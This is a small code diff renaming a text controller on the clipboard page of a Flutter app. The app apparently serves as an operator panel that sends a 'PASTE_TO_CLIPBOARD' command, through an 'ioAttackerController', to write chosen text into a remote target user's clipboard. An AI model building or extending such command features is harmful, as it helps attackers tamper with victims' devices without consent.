@@ -86,7 +86,7 @@ class ClipboardPage extends StatelessWidget {
                           BigInputField(
                             height: 140,
                             controller:
-                                generalController.generalController.value,
+                                generalController.commonController.value,
                             hintText:
                                 "Enter text you want to fill in user's clipboard",
                             textColor: Colors.black,
@@ -96,7 +96,7 @@ class ClipboardPage extends StatelessWidget {
                             text: "Fill",
                             onPressed: () {
                               if (generalController
-                                      .generalController.value.text !=
+                                      .commonController.value.text !=
                                   "") {
                                 ioAttackerController.submitCommand(
                                   targetId: targetId,
@@ -104,12 +104,12 @@ class ClipboardPage extends StatelessWidget {
                                     "text": 'PASTE_TO_CLIPBOARD',
                                     "command_args": {
                                       "text": generalController
-                                          .generalController.value.text
+                                          .commonController.value.text
                                           .trim()
                                     },
                                   },
                                 );
-                                generalController.generalController.value.clear();
+                                generalController.commonController.value.clear();
                               }
                             },
                             width: 100,
